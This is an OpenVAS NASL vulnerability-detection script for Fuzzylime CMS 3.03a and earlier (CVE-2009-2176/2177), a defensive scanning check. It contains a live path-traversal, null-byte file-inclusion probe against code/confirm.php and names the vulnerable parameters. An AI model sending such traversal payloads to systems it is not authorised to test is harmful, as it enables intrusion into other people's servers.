###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_fuzzylime_cms_code_exec_vuln.nasl 9334 2018-04-05 13:34:45Z cfischer $
#
# Fuzyylime(cms) Remote Code Execution Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:fuzzylime:fuzzylime_cms";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900584");
  script_version("$Revision: 9334 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-05 15:34:45 +0200 (Thu, 05 Apr 2018) $");
  script_tag(name:"creation_date", value:"2009-06-30 16:55:49 +0200 (Tue, 30 Jun 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-2176", "CVE-2009-2177");
  script_bugtraq_id(35418);
  script_name("Fuzyylime(cms) Remote Code Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_fuzzylime_cms_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("fuzzylimecms/installed");

  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/8978");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/51205");

  tag_impact = "Successful exploitation will allow attacker to include and execute
  arbitrary files from local and external resources, and can gain sensitive
  information about remote system directories when magic_quotes_gpc is disabled.

  Impact level: Application/System";

  tag_affected = "Fuzyylime(cms) version 3.03a and prior.";

  tag_insight = "The flaws are due to,

  - The data passed into 'list' parameter in code/confirm.php and to the
   'template' parameter in code/display.php is not properly verified
   before being used to include files.

  - Input passed to the 's' parameter in code/display.php is not properly
   verified before being used to write to a file.";

  tag_solution = "Upgrade to fuzzylime 3.03b or later,
  For updates refer to http://cms.fuzzylime.co.uk/st/content/download ";

  tag_summary = "This host is installed with Fuzyylime(cms) which is prone to
  Remote Code Execution vulnerability.";

  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) ) exit( 0 );

vers = infos['version'];
dir = infos['location'];
if( dir == "/" ) dir = "";

url = dir + "/code/confirm.php?e[]&list=../../admin/index.php\0";

sndReq = http_get( item:url, port:port );
rcvRes = http_send_recv( port:port, data:sndReq );

if( "admin/index.php" >< rcvRes ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

if( ! isnull( vers ) ) {
  if( version_is_less_equal( version:vers, test_version:"3.03a" ) ) {
    report = report_fixed_ver( installed_version:vers, fixed_version:"3.03b" );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
